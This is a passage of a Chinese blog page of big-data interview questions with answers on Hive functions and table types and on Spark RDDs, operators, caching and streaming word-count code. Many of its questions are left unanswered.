Cache读取HashTableFiles到内存中，顺序扫描大表，在Map阶段直接进行Join，将数据传递给下一个MapReduce任务。</li></ul></blockquote><h2 id><a href="#" class="headerlink" title></a></h2><h2 id="19-在hive的row-number中distribute-by-和-partition-by的区别"><a href="#19-在hive的row-number中distribute-by-和-partition-by的区别" class="headerlink" title="19.在hive的row_number中distribute by 和 partition by的区别"></a>19.在hive的row_number中distribute by 和 partition by的区别</h2><h2 id="20-hive开发中遇到什么问题"><a href="#20-hive开发中遇到什么问题" class="headerlink" title="20.hive开发中遇到什么问题?"></a>20.hive开发中遇到什么问题?</h2><h2 id="21-什么时候使用内部表-什么时候使用外部表"><a href="#21-什么时候使用内部表-什么时候使用外部表" class="headerlink" title="21.什么时候使用内部表,什么时候使用外部表"></a>21.什么时候使用内部表,什么时候使用外部表</h2><p>每天收集到的ng日志和埋点日志数据,需要做大量的统计数据分析,所以可以使用外部表进行存储，方便数据的共享，并且在对表做操作的时候不会误删原始数据。</p><p>在做统计分析时候用到的中间表，结果表可以使用内部表，因为这些数据不需要共享，使用内部表更为合适。并且很多时候分区表我们只需要保留最近3天的数据，用外部表的时候删除分区时无法删除数据</p><h2 id="22-hive都有哪些函数，你平常工作中用到哪些"><a href="#22-hive都有哪些函数，你平常工作中用到哪些" class="headerlink" title="22.hive都有哪些函数，你平常工作中用到哪些"></a>22.hive都有哪些函数，你平常工作中用到哪些</h2><ul><li>数学函数</li></ul><p>round(DOUBLE a)</p><p>floor(DOUBLE a)</p><p>ceil(DOUBLE a)</p><p>rand()</p><ul><li>集合函数</li></ul><p>size(Map&lt;K.V&gt;)</p><p>map_keys(Map&lt;K.V&gt;)</p><p>map_values(Map&lt;K.V&gt;)</p><p>array_contains(Array<T>, value)</T></p><p>sort_array(Array<T>)</T></p><ul><li>类型转换函数</li></ul><p>cast(expr as <type>)</type></p><ul><li>日期函数</li></ul><p>date_format函数（根据格式整理日期）<br>date_add、date_sub函数（加减日期）<br>next_day函数<br>last_day函数（求当月最后一天日期）<br>collect_set函数<br>get_json_object解析json函数</p><p>from_unixtime(bigint unixtime, string format)<br>to_date(string timestamp)<br>year(string date)<br>month(string date)<br>hour(string date)<br>weekofyear(string date)<br>datediff(string enddate, string startdate)<br>add_months(string start_date, int num_months)<br>date_format(date/timestamp/string ts, string fmt)</p><ul><li>条件函数</li></ul><p>if(boolean testCondition, T valueTrue, T valueFalseOrNull)</p><p>nvl(T value, T default_value)</p><p>COALESCE(T v1, T v2, …)</p><p>CASE a WHEN b THEN c [WHEN d THEN e]* [ELSE f] END</p><p>isnull( a )</p><p>isnotnull ( a )</p><ul><li>字符函数</li></ul><p>concat(string|binary A, string|binary B…)</p><p>concat_ws(string SEP, string A, string B…)</p><p>get_json_object(string json_string, string path)</p><p>length(string A)</p><p>lower(string A) lcase(string A)</p><p>parse_url(string urlString, string partToExtract [, string keyToExtract])</p><p>regexp_replace(string INITIAL_STRING, string PATTERN, string REPLACEMENT)</p><p>reverse(string A)</p><p>split(string str, string pat)</p><p>substr(string|binary A, int start) substring(string|binary A, int start)</p><ul><li>聚合函数</li></ul><p>count sum min max avg</p><ul><li>表生成函数</li></ul><p>explode(array&lt;<em>TYPE</em>&gt; a)</p><p>explode(ARRAY)</p><p>json_tuple(jsonStr, k1, k2, …)</p><p>parse_url_tuple(url, p1, p2, …)</p><p>23.手写sql，连续活跃用户</p><p>24.left semi join和left join区别</p><p>25.group by为什么要排序</p><p>26.说说印象最深的一次优化场景，hive常见的优化思路</p><h1 id="三-Spark"><a href="#三-Spark" class="headerlink" title="三.Spark"></a>三.Spark</h1><h2 id="1-rdd的属性"><a href="#1-rdd的属性" class="headerlink" title="1.rdd的属性"></a>1.rdd的属性</h2><p><img src="/2020/08/28/2020%E5%A4%A7%E6%95%B0%E6%8D%AE%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9C%9F%E9%A2%98%E6%80%BB%E7%BB%93(%E9%99%84%E7%AD%94%E6%A1%88)/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="img"></p><ul><li>一组分片（Partition），即数据集的基本组成单位。对于RDD来说，每个分片都会被一个计算任务处理，并决定并行计算的粒度。用户可以在创建RDD时指定RDD的分片个数，如果没有指定，那么就会采用默认值。默认值就是程序所分配到的CPU Core的数目。</li><li>一个计算每个分区的函数。Spark中RDD的计算是以分片为单位的，每个RDD都会实现compute函数以达到这个目的。compute函数会对迭代器进行复合，不需要保存每次计算的结果。</li><li>RDD之间的依赖关系。RDD的每次转换都会生成一个新的RDD，所以RDD之间就会形成类似于流水线一样的前后依赖关系。在部分分区数据丢失时，Spark可以通过这个依赖关系重新计算丢失的分区数据，而不是对RDD的所有分区进行重新计算。</li><li>一个Partitioner，即RDD的分片函数。当前Spark中实现了两种类型的分片函数，一个是基于哈希的HashPartitioner，另外一个是基于范围的RangePartitioner。只有对于于key-value的RDD，才会有Partitioner，非key-value的RDD的Parititioner的值是None。Partitioner函数不但决定了RDD本身的分片数量，也决定了parent RDD Shuffle输出时的分片数量。</li><li>一个列表，存储存取每个Partition的优先位置（preferred location）。对于一个HDFS文件来说，这个列表保存的就是每个Partition所在的块的位置。按照“移动数据不如移动计算”的理念，Spark在进行任务调度的时候，会尽可能地将计算任务分配到其所要处理数据块的存储位置。</li></ul><h2 id="2-算子分为哪几类-RDD支持哪几种类型的操作"><a href="#2-算子分为哪几类-RDD支持哪几种类型的操作" class="headerlink" title="2.算子分为哪几类(RDD支持哪几种类型的操作)"></a>2.算子分为哪几类(RDD支持哪几种类型的操作)</h2><p>转换（Transformation）  现有的RDD通过转换生成一个新的RDD。lazy模式，延迟执行。</p><p>转换函数包括：map，filter，flatMap，groupByKey，reduceByKey，aggregateByKey，union,join, coalesce 等等。</p><p>动作（Action）  在RDD上运行计算，并返回结果给驱动程序(Driver)或写入文件系统。</p><p>动作操作包括：reduce，collect，count，first，take，countByKey以及foreach等等。</p><p>collect  该方法把数据收集到driver端  Array数组类型</p><p>所有的transformation只有遇到action才能被执行。</p><p>当触发执行action之后，数据类型不再是rdd了，数据就会存储到指定文件系统中，或者直接打印结 果或者收集起来。</p><h2 id="3-创建rdd的几种方式"><a href="#3-创建rdd的几种方式" class="headerlink" title="3.创建rdd的几种方式"></a>3.创建rdd的几种方式</h2><p>1.集合并行化创建(有数据)</p><p>val arr = Array(1,2,3,4,5)</p><p>val rdd = sc.parallelize(arr)</p><p>val rdd =sc.makeRDD(arr)</p><p>2.读取外部文件系统，如hdfs，或者读取本地文件(最常用的方式)(没数据)</p><p>val rdd2 = sc.textFile(“hdfs://hdp-01:9000/words.txt”)</p><p>// 读取本地文件</p><p>val rdd2 = sc.textFile(“file:///root/words.txt”)</p><p>3.从父RDD转换成新的子RDD</p><p>调用Transformation类的方法，生成新的RDD</p><h2 id="4-spark运行流程"><a href="#4-spark运行流程" class="headerlink" title="4.spark运行流程"></a>4.spark运行流程</h2><p><img src="https://mmbiz.qpic.cn/mmbiz_png/dXCnejTRMLdfqmBAvcKIhLA5ZUrVlzNcZjABqamnfP83ib3Z7ibyrwXhDGuP0xFGXjvuROk2SDbDYzmNypuliaBOw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="img"></p><p>Worker的功能：定时和master通信；调度并管理自身的executor</p><p>executor：由Worker启动的，程序最终在executor中运行，（程序运行的一个容器）</p><p>spark-submit命令执行时，会根据master地址去向 Master发送请求，</p><p>Master接收到Dirver端的任务请求之后，根据任务的请求资源进行调度，（打散的策略），尽可能的 把任务资源平均分配，然后向WOrker发送指令</p><p>Worker收到Master的指令之后，就根据相应的资源，启动executor（cores,memory）</p><p>executor会向dirver端建立请求，通知driver，任务已经可以运行了</p><p>driver运行任务的时候，会把任务发送到executor中去运行。</p><h2 id="5-Spark中coalesce与repartition的区别"><a href="#5-Spark中coalesce与repartition的区别" class="headerlink" title="5.Spark中coalesce与repartition的区别"></a>5.Spark中coalesce与repartition的区别</h2><p>1）关系：</p><p>两者都是用来改变 RDD 的 partition 数量的，repartition 底层调用的就是 coalesce 方法：coalesce(numPartitions, shuffle = true)</p><p>2）区别：</p><p>repartition 一定会发生 shuffle，coalesce 根据传入的参数来判断是否发生 shuffle</p><p>一般情况下增大 rdd 的 partition 数量使用 repartition，减少 partition 数量时使用coalesce</p><h2 id="6-sortBy-和-sortByKey的区别"><a href="#6-sortBy-和-sortByKey的区别" class="headerlink" title="6.sortBy 和 sortByKey的区别"></a>6.sortBy 和 sortByKey的区别</h2><p>sortBy既可以作用于RDD[K] ，还可以作用于RDD[(k,v)]</p><p>sortByKey  只能作用于 RDD[K,V] 类型上。</p><h2 id="7-map和mapPartitions的区别"><a href="#7-map和mapPartitions的区别" class="headerlink" title="7.map和mapPartitions的区别"></a>7.map和mapPartitions的区别</h2><p><img src="https://mmbiz.qpic.cn/mmbiz_png/dXCnejTRMLdfqmBAvcKIhLA5ZUrVlzNcwzb39cos41iars5XLdSzl8r2BGuRYDRicU7D4fWjdZZmGvnV3HJ4ib2Dg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="img"></p><h2 id="8-数据存入Redis-优先使用map-mapPartitions-foreach-foreachPartions哪个"><a href="#8-数据存入Redis-优先使用map-mapPartitions-foreach-foreachPartions哪个" class="headerlink" title="8.数据存入Redis  优先使用map mapPartitions  foreach  foreachPartions哪个"></a>8.数据存入Redis  优先使用map mapPartitions  foreach  foreachPartions哪个</h2><p>使用 foreachPartition</p><p>  * 1,map mapPartition  是转换类的算子， 有返回值</p><p>  * 2, 写mysql,redis 的连接</p><p>  foreach  * 100万     100万次的连接</p><p>  foreachPartions * 200 个分区   200次连接  一个分区中的数据，共用一个连接</p><p>foreachParititon 每次迭代一个分区，foreach每次迭代一个元素。</p><p>该方法没有返回值，或者Unit</p><p>主要作用于，没有返回值类型的操作（打印结果，写入到mysql数据库中）</p><p>在写入到redis,mysql的时候，优先使用foreachPartititon</p><h2 id="9-reduceByKey和groupBykey的区别"><a href="#9-reduceByKey和groupBykey的区别" class="headerlink" title="9.reduceByKey和groupBykey的区别"></a>9.reduceByKey和groupBykey的区别</h2><p><img src="https://mmbiz.qpic.cn/mmbiz_png/dXCnejTRMLdfqmBAvcKIhLA5ZUrVlzNc1MniaVffEJmU6WA9KpEnQIrx71bgGOc5vnpMfM1RheJeJEDhMoXPDow/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="img"></p><p>reduceByKey会传一个聚合函数， 相当于  groupByKey + mapValues</p><p>reduceByKey 会有一个分区内聚合，而groupByKey没有  最核心的区别  </p><p>结论：reduceByKey有分区内聚合，更高效，优先选择使用reduceByKey。</p><h2 id="10-cache和checkPoint的比较"><a href="#10-cache和checkPoint的比较" class="headerlink" title="10.cache和checkPoint的比较"></a>10.cache和checkPoint的比较</h2><p>都是做 RDD 持久化的</p><p>1.缓存，是在触发action之后，把数据写入到内存或者磁盘中。不会截断血缘关系</p><p>（设置缓存级别为memory_only：内存不足，只会部分缓存或者没有缓存，缓存会丢失,memory_and_disk :内存不足，会使用磁盘）</p><p>2.checkpoint 也是在触发action之后，执行任务。单独再启动一个job，负责写入数据到hdfs中。（把rdd中的数据，以二进制文本的方式写入到hdfs中，有几个分区，就有几个二进制文件）</p><p>3.某一个RDD被checkpoint之后，他的父依赖关系会被删除，血缘关系被截断，该RDD转换成了CheckPointRDD，以后再对该rdd的所有操作，都是从hdfs中的checkpoint的具体目录来读取数据。缓存之后，rdd的依赖关系还是存在的。</p><h2 id="11-spark-streaming流式统计单词数量代码"><a href="#11-spark-streaming流式统计单词数量代码" class="headerlink" title="11.spark streaming流式统计单词数量代码"></a>11.spark streaming流式统计单词数量代码</h2><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">WordCountAll</span> </span>&#123;</span><br><span class="line">  <span class="comment">// newValues当前批次的出现的单词次数， runningCount表示之前运行的单词出现的结果</span></span><br><span class="line"> <span class="comment">/* def updateFunction(newValues: Seq[Int], runningCount: Option[Int]): Option[Int] = &#123;</span></span><br><span class="line"><span class="comment">    val newCount =  newValues.sum + runningCount.getOrElse(0)// 将历史前几个批次的值和当前批次的值进行累加返回当前批次最终的结果</span></span><br><span class="line"><span class="comment">    Some(newCount)</span></span><br><span class="line"><span class="comment">  &#125;*/</span></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * String : 单词 hello</span></span><br><span class="line"><span class="comment">    * Seq[Int] ：单词在当前批次出现的次数</span></span><br><span class="line"><span class="comment">    * Option[Int] ：历史结果</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">  <span class="keyword">val</span> updateFunc = (iter: <span class="type">Iterator</span>[(<span class="type">String</span>, <span class="type">Seq</span>[<span class="type">Int</span>], <span class="type">Option</span>[<span class="type">Int</span>])]) =&gt; &#123;</span><br><span class="line">    <span class="comment">//iter.flatMap(it=&gt;Some(it._2.sum + it._3.getOrElse(0)).map(x=&gt;(it._1,x)))</span></span><br><span class="line">    iter.flatMap&#123;<span class="keyword">case</span>(x,y,z)=&gt;<span class="type">Some</span>(y.sum + z.getOrElse(<span class="number">0</span>)).map(m=&gt;(x, m))&#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 屏蔽日志</span></span><br><span class="line">  <span class="type">Logger</span>.getLogger(<span class="string">"org.apache"</span>).setLevel(<span class="type">Level</span>.<span class="type">ERROR</span>)</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]) &#123;</span><br><span class="line">    <span class="comment">// 必须要开启2个以上的线程，一个线程用来接收数据，另外一个线程用来计算</span></span><br><span class="line">    <span class="keyword">val</span> conf = <span class="keyword">new</span> <span class="type">SparkConf</span>().setMaster(<span class="string">"local[2]"</span>).setAppName(<span class="string">"NetworkWordCount"</span>)</span><br><span class="line">      <span class="comment">// 设置sparkjob计算时所采用的序列化方式</span></span><br><span class="line">      .set(<span class="string">"spark.serializer"</span>, <span class="string">"org.apache.spark.serializer.KryoSerializer"</span>)</span><br><span class="line">      .set(<span class="string">"spark.rdd.compress"</span>, <span class="string">"true"</span>) <span class="comment">// 节约大量的内存内容</span></span><br><span class="line">    <span class="comment">// 如果你的程序出现垃圾回收时间过程，可以设置一下java的垃圾回收参数</span></span><br><span class="line">    <span class="comment">// 同时也会创建sparkContext对象</span></span><br><span class="line">    <span class="comment">// 批次时间 &gt;= 批次处理的总时间 (批次数据量，集群的计算节点数量和配置)</span></span><br><span class="line">    <span class="keyword">val</span> ssc = <span class="keyword">new</span> <span class="type">StreamingContext</span>(conf, <span class="type">Seconds</span>(<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment">//做checkpoint 写入共享存储中</span></span><br><span class="line">    ssc.checkpoint(<span class="string">"c://aaa"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建一个将要连接到 hostname:port 的 DStream，如 localhost:9999</span></span><br><span class="line">    <span class="keyword">val</span> lines: <span class="type">ReceiverInputDStream</span>[<span class="type">String</span>] = ssc.socketTextStream(<span class="string">"192.168.175.101"</span>, <span class="number">44444</span>)</span><br><span class="line">    <span class="comment">//updateStateByKey结果可以累加但是需要传入一个自定义的累加函数：updateFunc</span></span><br><span class="line">    <span class="keyword">val</span> results = lines.flatMap(_.split(<span class="string">" "</span>)).map((_,<span class="number">1</span>)).updateStateByKey(updateFunc, <span class="keyword">new</span> <span class="type">HashPartitioner</span>(ssc.sparkContext.defaultParallelism), <span class="literal">true</span>)</span><br><span class="line">    <span class="comment">//打印结果到控制台</span></span><br><span class="line">    results.print()</span><br><span class="line">    <span class="comment">//开始计算</span></span><br><span class="line">    ssc.start()</span><br><span class="line">    <span class="comment">//等待停止</span></span><br><span class="line">    ssc.awaitTermination()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="12-简述map和flatMap的区别和应用场景"><a href="#12-简述map和flatMap的区别和应用场景" class="headerlink" title="12.简述map和flatMap的区别和应用场景"></a>12.简述map和flatMap的区别和应用场景</h2><p>map是对每一个元素进行操作，flatmap是对每一个元素操作后并压平</p><h2 id="13-计算曝光数和点击数"><a href="#13-计算曝光数和点击数" class="headerlink" title="13.计算曝光数和点击数"></a>13.计算曝光数和点击数</h2><p><img src="/2020/08/28/2020%E5%A4%A7%E6%95%B0%E6%8D%AE%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9C%9F%E9%A2%98%E6%80%BB%E7%BB%93(%E9%99%84%E7%AD%94%E6%A1%88)/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="img"></p><h2 id="-1"><a href="#-1" class="headerlink" title></a></h2><h2 id="14-分别列出几个常用的transformation和action算子"><a href="#14-分别列出几个常用的transformation和action算子" class="headerlink" title="14.分别列出几个常用的transformation和action算子"></a>14.分别列出几个常用的transformation和action算子</h2><blockquote><ul><li>转换算子：map,map,filter,reduceByKey,groupByKey,groupBy</li><li>行动算子：foreach，foreachpartition,collect,collectAsMap,take,top,first,count,countByKey</li></ul></blockquote><h2 id="-2"><a href="#-2" class="headerlink" title></a></h2><h2 id="15-按照需求使用spark编写以下程序，要求使用scala语言"><a href="#15-按照需求使用spark编写以下程序，要求使用scala语言" class="headerlink" title="15.按照需求使用spark编写以下程序，要求使用scala语言"></a>15.按照需求使用spark编写以下程序，要求使用scala语言</h2><p>当前文件a.txt的格式，请统计每个单词出现的次数</p><p>A,b,c</p><p>B,b,f,e</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">WordCount</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">val</span> conf = <span class="keyword">new</span> <span class="type">SparkConf</span>()</span><br><span class="line">      .setAppName(<span class="keyword">this</span>.getClass.getSimpleName)</span><br><span class="line">      .setMaster(<span class="string">"local[*]"</span>)</span><br><span class="line">    <span class="keyword">val</span> sc = <span class="keyword">new</span> <span class="type">SparkContext</span>(conf)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> sData: <span class="type">RDD</span>[<span class="type">String</span>] = sc.textFile(<span class="string">"a.txt"</span>)</span><br><span class="line">    <span class="keyword">val</span> sortData: <span class="type">RDD</span>[(<span class="type">String</span>, <span class="type">Int</span>)] = sData.flatMap(_.split(<span class="string">","</span>)).map((_,<span class="number">1</span>)).reduceByKey(_+_)</span><br><span class="line">    sortData.foreach(print)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="16-spark应用程序的执行命令是什么？"><a href="#16-spark应用程序的执行命令是什么？" class="headerlink" title="16.spark应用程序的执行命令是什么？"></a>16.spark应用程序的执行命令是什么？</h2><blockquote><p>/usr/local/spark-current2.3/bin/spark-submit \</p><p>–class com.wedoctor.Application \</p><p>–master yarn \</p><p>–deploy-mode client \</p><p>–driver-memory 1g \</p><p>–executor-memory 2g \</p><p>–queue root.wedw \</p><p>–num-executors 200 \</p><p>–jars /home/pgxl/liuzc/config-1.3.0.jar,/home/pgxl/liuzc/hadoop-lzo-0.4.20.jar,/home/pgxl/liuzc/elasticsearch-hadoop-hive-2.3.4.jar \</p><p>/home/pgxl/liuzc/sen.jar</p></blockquote><h2 id="-3"><a href="#-3" class="headerlink" title></a></h2><h2 id="17-Spark应用执行有哪些模式，其中哪几种是集群模式"><a href="#17-Spark应用执行有哪些模式，其中哪几种是集群模式" class="headerlink" title="17.Spark应用执行有哪些模式，其中哪几种是集群模式"></a>17.Spark应用执行有哪些模式，其中哪几种是集群模式</h2><ul><li>本地local模式</li><li>standalone模式</li><li>spark on yarn模式</li><li>spark on mesos模式</li></ul><p>其中，standalone模式，spark on yarn模式，spark on mesos模式是集群模式</p><h2 id="18-请说明spark中广播变量的用途"><a href="#18-请说明spark中广播变量的用途" class="headerlink" title="18.请说明spark中广播变量的用途"></a>18.请说明spark中广播变量的用途</h2><p>使用广播变量，每个 Executor 的内存中，只驻留一份变量副本，而不是对 每个 task 都传输一次大变量，省了很多的网络传输， 对性能提升具有很大帮助， 而且会通过高效的广播算法来减少传输代价。</p><h2 id="19-以下代码会报错吗？如果会怎么解决-val-arr-new-ArrayList-String-arr-foreach-println"><a href="#19-以下代码会报错吗？如果会怎么解决-val-arr-new-ArrayList-String-arr-foreach-println" class="headerlink" title="19.以下代码会报错吗？如果会怎么解决 val arr = new ArrayList[String]; arr.foreach(println)"></a>19.以下代码会报错吗？如果会怎么解决 val arr = new ArrayList[String]; arr.foreach(println)</h2><p>val arr = new ArrayList[String]; 这里会报错，需要改成 val arr: Array[String] = new Array<a href="10">String</a></p><p>arr.foreach(println)打印不会报空指针</p><h2 id="-4"><a href="#-4" class="headerlink" title></a></h2><h2 id="20-写出你用过的spark中的算子，其中哪些会产生shuffle过程"><a href="#20-写出你用过的spark中的算子，其中哪些会产生shuffle过程" class="headerlink" title="20.写出你用过的spark中的算子，其中哪些会产生shuffle过程"></a>20.写出你用过的spark中的算子，其中哪些会产生shuffle过程</h2><p>reduceBykey：</p><p>groupByKey：</p><p>…ByKey:</p><h2 id="-5"><a href="#-5" class="headerlink" title></a></h2><h2 id="21-Spark中rdd与partition的区别"><a href="#21-Spark中rdd与partition的区别" class="headerlink" title="21.Spark中rdd与partition的区别"></a>21.Spark中rdd与partition的区别</h2><h2 id="22-请写出创建Dateset的几种方式"><a href="#22-请写出创建Dateset的几种方式" class="headerlink" title="22.请写出创建Dateset的几种方式"></a>22.请写出创建Dateset的几种方式</h2><h2 id="23-描述一下RDD，DataFrame，DataSet的区别？"><a href="#23-描述一下RDD，DataFrame，DataSet的区别？" class="headerlink" title="23.描述一下RDD，DataFrame，DataSet的区别？"></a>23.描述一下RDD，DataFrame，DataSet的区别？</h2><p><strong>1）RDD</strong></p><p>优点:</p><p>编译时类型安全</p><p>编译时就能检查出类型错误</p><p>面向对象的编程风格</p><p>直接通过类名点的方式来操作数据</p><p>缺点:</p><p>序列化和反序列化的性能开销</p><p>无论是集群间的通信, 还是 IO 操作都需要对对象的结构和数据进行序列化和反序列化。</p><p>GC 的性能开销，频繁的创建和销毁对象, 势必会增加 GC</p><p><strong>2）DataFrame</strong></p><p>DataFrame 引入了 schema 和 off-heap</p><p>schema : RDD 每一行的数据, 结构都是一样的，这个结构就存储在 schema 中。Spark 通过 schema 就能够读懂数据, 因此在通信和 IO 时就只需要序列化和反序列化数据, 而结构的部分就可以省略了。</p><p><strong>3）DataSet</strong></p><p>DataSet 结合了 RDD 和 DataFrame 的优点，并带来的一个新的概念 Encoder。</p><p>当序列化数据时，Encoder 产生字节码与 off-heap 进行交互，能够达到按需访问数据的效果，而不用反序列化整个对象。Spark 还没有提供自定义 Encoder 的 API，但是未来会加入。</p><p>三者之间的转换：</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/dXCnejTRMLdfqmBAvcKIhLA5ZUrVlzNc1WAYYgZST85YQWcaeIicdD1s1kPqWQRzpIaQSoKqCIuWLiaibj6vXH5yA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="img"></p><h2 id="-6"><a href="#-6" class="headerlink" title></a></h2><h2 id="24-描述一下Spark中stage是如何划分的？描述一下shuffle的概念"><a href="#24-描述一下Spark中stage是如何划分的？描述一下shuffle的概念" class="headerlink" title="24.描述一下Spark中stage是如何划分的？描述一下shuffle的概念"></a>24.描述一下Spark中stage是如何划分的？描述一下shuffle的概念</h2><h2 id="25-Spark-在yarn上运行需要做哪些关键的配置工作？如何kill-个Spark在yarn运行中Application"><a href="#25-Spark-在yarn上运行需要做哪些关键的配置工作？如何kill-个Spark在yarn运行中Application" class="headerlink" title="25.Spark 在yarn上运行需要做哪些关键的配置工作？如何kill -个Spark在yarn运行中Application"></a>25.Spark 在yarn上运行需要做哪些关键的配置工作？如何kill -个Spark在yarn运行中Application</h2><h2 id="26-通常来说，Spark与MapReduce相比，Spark运行效率更高。请说明效率更高来源于Spark内置的哪些机制？并请列举常见spark的运行模式？"><a href="#26-通常来说，Spark与MapReduce相比，Spark运行效率更高。请说明效率更高来源于Spark内置的哪些机制？并请列举常见spark的运行模式？" class="headerlink" title="26.通常来说，Spark与MapReduce相比，Spark运行效率更高。请说明效率更高来源于Spark内置的哪些机制？并请列举常见spark的运行模式？"></a>26.通常来说，Spark与MapReduce相比，Spark运行效率更高。请说明效率更高来源于Spark内置的哪些机制？并请列举常见spark的运行模式？</h2><h2 id="27-RDD中的数据在哪？"><a href="#27-RDD中的数据在哪？" class="headerlink" title="27.RDD中的数据在哪？"></a>27.RDD中的数据在哪？</h2><p>RDD中的数据在数据源，RDD只是一个抽象的数据集，我们通过对RDD的操作就相当于对数据进行操作。</p><h2 id="28-如果对RDD进行cache操作后，数据在哪里？"><a href="#28-如果对RDD进行cache操作后，数据在哪里？" class="headerlink" title="28.如果对RDD进行cache操作后，数据在哪里？"></a>28.如果对RDD进行cache操作后，数据在哪里？</h2><p>数据在第一执行cache算子时会被加载到各个Executor进程的内存中，第二次就会直接从内存中读取而不会区磁盘。</p><h2 id="29-Spark中Partition的数量由什么决定"><a href="#29-Spark中Partition的数量由什么决定" class="headerlink" title="29.Spark中Partition的数量由什么决定"></a>29.Spark中Partition的数量由什么决定</h2><p>和Mr一样，但是Spark默认最少有两个分区。</p><h2 id="30-Scala里面的函数和方法有什么区别"><a href="#30-Scala里面的函数和方法有什么区别" class="headerlink" title="30.Scala里面的函数和方法有什么区别"></a>30.Scala里面的函数和方法有什么区别</h2><h2 id="31-SparkStreaming怎么进行监控"><a href="#31-SparkStreaming怎么进行监控" class="headerlink" title="31.SparkStreaming怎么进行监控?"></a>31.SparkStreaming怎么进行监控?</h2><h2 id="32-Spark判断Shuffle的依据"><a href="#32-Spark判断Shuffle的依据" class="headerlink" title="32.Spark判断Shuffle的依据?"></a>32.Spark判断Shuffle的依据?</h2><p> 父RDD的一个分区中的数据有可能被分配到子RDD的多个分区中</p><h2 id="33-Scala有没有多继承？可以实现多继承么？"><a href="#33-Scala有没有多继承？可以实现多继承么？" class="headerlink" title="33.Scala有没有多继承？可以实现多继承么？"></a>33.Scala有没有多继承？可以实现多继承么？</h2><h2 id="34-Sparkstreaming和flink做实时处理的区别"><a href="#34-Sparkstreaming和flink做实时处理的区别" class="headerlink" title="34.Sparkstreaming和flink做实时处理的区别"></a>34.Sparkstreaming和flink做实时处理的区别</h2><h2 id="35-Sparkcontext的作用"><a href="#35-Sparkcontext的作用" class="headerlink" title="35.Sparkcontext的作用"></a>35.Sparkcontext的作用</h2><h2 id="36-Sparkstreaming读取kafka数据为什么选择直连方式"><a href="#36-Sparkstreaming读取kafka数据为什么选择直连方式" class="headerlink" title="36.Sparkstreaming读取kafka数据为什么选择直连方式"></a>36.Sparkstreaming读取kafka数据为什么选择直连方式</h2><h2 id="37-离线分析什么时候用sparkcore和sparksq"><a href="#37-离线分析什么时候用sparkcore和sparksq" class="headerlink" title="37.离线分析什么时候用sparkcore和sparksq"></a>37.离线分析什么时候用sparkcore和sparksq</h2><h2 id="38-Sparkstreaming实时的数据不丢失的问题"><a href="#38-Sparkstreaming实时的数据不丢失的问题" class="headerlink" title="38.Sparkstreaming实时的数据不丢失的问题"></a>38.Sparkstreaming实时的数据不丢失的问题</h2><h2 id="39-简述宽依赖和窄依赖概念，groupByKey-reduceByKey-map-filter-union五种操作哪些会导致宽依赖，哪些会导致窄依赖"><a href="#39-简述宽依赖和窄依赖概念，groupByKey-reduceByKey-map-filter-union五种操作哪些会导致宽依赖，哪些会导致窄依赖" class="headerlink" title="39.简述宽依赖和窄依赖概念，groupByKey,reduceByKey,map,filter,union五种操作哪些会导致宽依赖，哪些会导致窄依赖"></a>39.简述宽依赖和窄依赖概念，groupByKey,reduceByKey,map,filter,union五种操作哪些会导致宽依赖，哪些会导致窄依赖</h2><h2 